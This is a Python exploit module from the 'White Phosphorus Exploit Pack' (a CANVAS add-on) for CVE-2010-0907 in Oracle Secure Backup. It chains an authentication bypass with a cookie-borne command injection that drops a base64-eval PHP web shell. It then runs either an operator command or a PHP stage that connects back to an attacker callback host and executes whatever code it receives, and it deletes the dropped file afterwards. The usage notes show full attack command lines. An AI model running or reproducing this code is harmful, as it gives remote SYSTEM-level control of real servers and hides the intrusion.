
#! /usr/bin/env python
######################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
######################################################################################


#Standard Imports
import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import sys
import time

# CANVAS modules
from wp_exploit import *
from wp_dialog import *
from wp_osversions import *
import canvasengine
import libs.spkproxy as spkproxy

######################################################################################
NAME = "Oracle Secure Backup Remote SYSTEM Command Execution"
DESCRIPTION = "Remote SYSTEM command execution vulnerability in Oracle Secure Backup"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']='Oracle'
DOCUMENTATION["Date public"] = "2010-07-13"
DOCUMENTATION["Repeatability"] = "Unlimited"
DOCUMENTATION['CVE Name']="CVE-2010-0907"
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-0907'
DOCUMENTATION['CVSS'] = 8.6
DOCUMENTATION["References"] = "http://www.zerodayinitiative.com/advisories/ZDI-10-124/"
DOCUMENTATION['VersionsAffected']='Oracle Secure Backup 10.3.0.1'
DOCUMENTATION["Notes"] = """Results in a scriptnode been sent back.
"""

# Targets
PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = ["2003","XP","Vista","7","2000","2008"]


NOTES="""
---------------------------------------------------------------------
WP> White Phosphorus Exploit Pack
WP> Oracle Secure Backup Remote SYSTEM Command Execution
---------------------------------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip> -d <callback port>

Payload Options:
-O payload:<#>   (will use default if not specified)
-O command:<cmd> (for Execute Command payload)
-O bind:<port>   (for Bind MOSDEF Shell)

Versions:
0: Windows

Payloads:
0: TCP Connect Back
1: Execute Command

Example:
./commandlineInterface.py -p 5555 -v 17
./3rdparty/White_Phosphorus/exploits/wp_oracle_securebackup_exec/wp_oracle_securebackup_exec.py  -v0 -t 10.1.1.10 -l 10.1.1.1 -d 5555 -O payload:0
./3rdparty/White_Phosphorus/exploits/wp_oracle_securebackup_exec/wp_oracle_securebackup_exec.py  -v0 -t 10.1.1.10 -l 10.1.1.1 -d 5555 -O payload:1 -O command:dir
"""

PORT = 443
######################################################################################

# Dialog Hooks
def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return 

targets = {
    0 : ["Windows", (0x00000000), [WINALL]]
}

class theexploit(wp_exploit):
            ######################################################################################
            ## WP> Dialog Information
            ##########################s###########################################################
    PAYLOADS=["TCP Connect Back",
              "Execute Command"]

    DEFAULT_PAYLOAD = 0

    def __init__(self):
        tcpexploit.__init__(self)
        self.host = "127.0.0.1"
        self.port = PORT
        self.targets = targets
        self.version = 0
        self.badstring = "\x00\x0a\x0d"
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.autoVersioned = False
        self.ssl = 1
        return

    def usage(self):
        self.wp_usage(targets)
        return 
    
    def test(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        
        useragentstring = "https://"+self.host+":%s"%self.port+"/"
        UA = spkproxy.UserAgent(useragentstring, auth=None, hostname=self.host, exploit=self)
        
        data = UA.GET("login.php", noresponse=False)
        
        ret = 0
        if ((data.find("Oracle Secure Backup Web Interface")) > 0):
            ret = 1
        return ret

    def neededListenerTypes(self):
        self.getArgs()
        return [canvasengine.UNIVERSAL_MOSDEF]   

    def getArgs(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
                
        if self.argsDict.get('payloadType','') == 'Execute Command':
            self.shell_EXECCMD = True
            self.execCMD = self.argsDict.get('payloadExecCmd','cmd /c')
            self.command = self.execCMD
        elif self.argsDict.get("command",self.command):
            self.command = self.argsDict.get("command",self.command)
        
        self.versions[1] = ["Oracle Secure Backup"]
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return
    
    def get_php_stage1(self, badchars,localhost,localport):
        universal = self
        phpcode=""
        if universal!=None:
            phpcode +="""
            function htonl($my_int) {
                $data=chr($my_int & 0xff000000).chr($my_int & 0x00ff0000).chr($my_int & 0x0000ff00).chr($my_int & 0x000000ff);
                return $data;
            }
            """
        phpcode+="""
    
function read_block($sock) {
   $data=fread($sock,4);
   $size=(ord($data{0}) * (pow(2,24))) + (ord($data{1}) * pow(2,16)) + (ord($data{2}) * pow(2,8)) + ord($data{3});
   $data2="";
   while ($size > 0 ) {
      $data3=fread($sock,$size);
      if ($data3==FALSE) {
         break;
      }
      $data2=$data2.$data3;
      $size-=strlen($data3);
   } 
   return $data2;
}

$f=fsockopen("LOCALHOST",LOCALPORT);

if ($f) {
    """
        if universal!=None:
            import canvasengine
            #here we send two integers down the line
            mosdef_type = universal.engine.getMosdefType(canvasengine.PHPMULTI)
            mosdef_id = universal.engine.getNewMosdefID(universal)
            
            phpcode+="""
            fwrite($f,htonl(MOSDEF_TYPE));
            fwrite($f,htonl(MOSDEF_ID));
            """
        phpcode+="""
    while (1) {
       $data=read_block($f);
       if ($data=="") {
        break;
       }
       eval($data);
    }
  }
        """
        phpcode=phpcode.replace("LOCALHOST",str(localhost))
        phpcode=phpcode.replace("LOCALPORT",str(localport))  
        if universal!=None:
            phpcode=phpcode.replace("MOSDEF_TYPE",str(mosdef_type))
            phpcode=phpcode.replace("MOSDEF_ID",str(mosdef_id))
        return phpcode
    
    def get_php_to_mosdef(self):
        localhost=self.callback.ip
        localport=self.callback.port

        badchars=""
        payload = self.get_php_stage1(badchars,localhost,localport)
        return payload
        
    def shutdown(self):
        self.done=1

    def run(self):
        self.getArgs()

        useragentstring = "https://"+self.host+":%s"%self.port+"/"
        UA = spkproxy.UserAgent(useragentstring, auth=None, hostname=self.host, exploit=self)
        
        self.log("WP> Sending Exploit Stage 1 - Authentication Bypass")
        data = UA.POST("login.php", "button=Login&attempt=1&uname=-%s"%wp_randomstring(1), extraheaders=None, noresponse=False)
        
        eval_file = "_" + wp_randomstring(4) + "_" + ".php"
        eval_code = wp_randomstring(1) + "%26cmd%20/c%20echo%20\"%3c%3f%70%68%70%20%65%76%61%6c%28%62%61%73%65%36%34%5f%64%65%63%6f%64%65%28%24%5f%47%45%54%5b%63%5d%29%29%3b%20%3f%3e\">%20" + eval_file + "&dir"              
        
        UA.SetCookie("olist", eval_code)
        data = UA.POST("property_box.php","type=Dataset&objectname[]=%s"%(wp_randomstring(1)), extraheaders=None, noresponse=True)
        UA.ClearCookies()
        time.sleep(2)
                      
        if self.command:
            command = "system(\"" + self.command + "\");"
            
            self.log("WP> Sending Exploit Stage 2 - Executing Command: %s"%self.command)
            data = UA.GET("%s?c=%s"%(eval_file, b64encode(command).strip()), noresponse=False)
            self.log(data)
            time.sleep(2)
            
            command = "system(\"del /Q /F " + eval_file + "\");"
            data = UA.GET("%s?c=%s"%(eval_file, b64encode(command).strip()), noresponse=False)
            
            ret = 1
        else:
            command = self.get_php_to_mosdef().strip()
            
            self.log("WP> Sending Exploit Stage 2: Payload\n")
            data = UA.GET("%s?c=%s"%(eval_file, b64encode(command).strip()), noresponse=True)
            time.sleep(2)
            
            command = "system(\"del /Q /F " + eval_file + "\");"
            data = UA.GET("%s?c=%s"%(eval_file, b64encode(command).strip()), noresponse=False)
            
            for i in xrange(0,3):
                time.sleep(1)
                ret = self.ISucceeded()
                if ret:
                    break
            if not ret:
                self.log("WP> Did not succeed in getting a connectback")
        if ret:
            self.setInfo("WP> %s attacking %s:%d - completed (success!)"%(NAME,self.host,self.port))
        else:
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
        return ret

if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
